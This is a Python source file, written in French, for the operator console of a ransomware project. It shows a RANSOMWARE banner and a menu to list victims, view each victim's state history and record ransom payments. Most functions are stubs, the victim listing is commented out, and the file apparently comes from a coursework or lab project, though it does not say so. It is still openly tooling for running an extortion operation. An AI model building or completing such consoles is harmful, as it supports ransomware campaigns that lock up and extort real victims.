from datetime import datetime
import utile.network as network
import utile.message as message
import utile.security as security
import utile.config as config
import utile.input as my_input


# Constantes
IP_SERV_CONSOLE = ''
PORT_SERV_CONSOLE = 0

ascii_art = '''
  _____            _   _  _____  ____  __  ____          __     _____  ______ 
 |  __ \     /\   | \ | |/ ____|/ __ \|  \/  \ \        / /\   |  __ \|  ____|
 | |__) |   /  \  |  \| | (___ | |  | | \  / |\ \  /\  / /  \  | |__) | |__   
 |  _  /   / /\ \ | . ` |\___ \| |  | | |\/| | \ \/  \/ / /\ \ |  _  /|  __|  
 | | \ \  / ____ \| |\  |____) | |__| | |  | |  \  /\  / ____ \| | \ \| |____ 
 |_|  \_\/_/    \_\_| \_|_____/ \____/|_|  |_|   \/  \/_/    \_\_|  \_\______|
                                                                              
'''
def affichage_menu():
    print("")
    print("============================================================================")
    print(ascii_art)
    print("============================================================================")
    print("1) Liste de victimes du ransomware")
    print("2) Historiques des états d'une victime")
    print("3) Renseigner le payement de rançon d'une victime")
    print("4) Quitter")


def affichage_liste_victimes():

    print("")
    print("")
    print("LISTING DES VICTIMES DU RANSOMWARE")
    print("____________________________________________________________________________")
    print(f"{'id':<4}{'hash':<12}{'type':<12}{'disques':<12}{'statut':<10}{'nb. de fichiers'}")

    '''
    for victime in victimes:
      print(f"{id:<4}{hash:<12}{type:<12}{disque:<12}{statut:<10}{nb. de fichiers}")
    '''
def affichage_historique_etat_victimes():
    print("")
    print("")
    print("HISTORIQUE DES ETATS D'UNE VICTIME")
    print("__________________________________")
    choix_victime = input("Entrez le numéro de la victime : ")

def affichage_payement_rancon():
    print("")
    print("")
    print("RENSEIGNER LE PAYEMENT DE RANCON D'UNE VICTIME")
    print("______________________________________________")
    choix_victime = input("Entrez le numéro de la victime : ")
    montant = input("Entrez le montant payé : ")
    date_payement = input("Entrez la date du payement : ")
    print(f"Le payement de {montant} a été enregistré pour la victime {choix_victime} le {date_payement}.")



def main():
    continuer = True
    while continuer:
        affichage_menu()
        choix_user = input("Votre choix : ")
        if choix_user == "1":
            affichage_liste_victimes()
        elif choix_user == "2":
            affichage_historique_etat_victimes()
        elif choix_user == "3":
            affichage_payement_rancon()
        elif choix_user == "4":
            print("Au revoir")
            continuer = False
        else:
            print("Choix invalide. Veuillez entrer un nombre entre 1 et 4.")
    exit(0)

if __name__ == '__main__':
    main()
